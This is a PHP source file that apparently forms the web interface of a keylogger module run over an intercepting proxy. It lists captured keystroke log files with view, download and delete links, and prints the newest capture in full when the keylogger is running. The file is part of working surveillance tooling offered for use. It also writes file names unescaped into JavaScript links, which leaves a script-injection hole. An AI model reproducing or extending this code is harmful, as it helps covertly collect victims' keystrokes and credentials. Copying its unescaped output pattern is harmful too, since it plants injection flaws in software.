<?php

require("keylogger_vars.php");

if (isset($_GET['history']))
{
	$capture_list = array_reverse(glob($module_path."capture/*.txt"));

	if(count($capture_list) == 0)
		echo "<em>No capture history...</em>";
	
	for($i=0;$i<count($capture_list);$i++)
	{
		$file = basename($capture_list[$i],".txt");
		$info = explode("_", basename($capture_list[$i]));
		echo $info[1]." - ";
		echo dataSize($module_path."capture/".basename($capture_list[$i]))." [";
		echo "<a href=\"javascript:load_file('".$file.".txt');\">view</a> | ";
		echo "<a href=\"javascript:javascript:location.href='capture/".$file.".txt'\">download</a> | ";
		echo "<a href=\"javascript:delete_file('".$file."');\">delete</a>]<br />";
	}
}

if (isset($_GET['lastlog']))
{
	if($installed && $keylogger_hook_ip != "")
	{
		if($is_keylogger_running)
		{
			$path = $module_path."capture";

			$latest_ctime = 0;
			$latest_filename = '';  

			$d = dir($path);
			while (false !== ($entry = $d->read())) {
			  $filepath = "{$path}/{$entry}";
			  if (is_file($filepath) && filectime($filepath) > $latest_ctime) {
			      $latest_ctime = filectime($filepath);
			      $latest_filename = $entry;
			    }
			}
		
			if($latest_filename != "")
			{
				$log_date = date ("F d Y H:i:s", filemtime($module_path."capture/".$latest_filename));
				echo "capture ".$latest_filename." [".$log_date."]\n";
				echo file_get_contents($module_path."capture/".$latest_filename);
			}
			else
			{
				echo "No data captured...";
			}
		}
		else
		{
			echo "Proxy is not running...";
		}
	}
	else
	{
		echo "Keylogger is not installed...";
	}
}

?>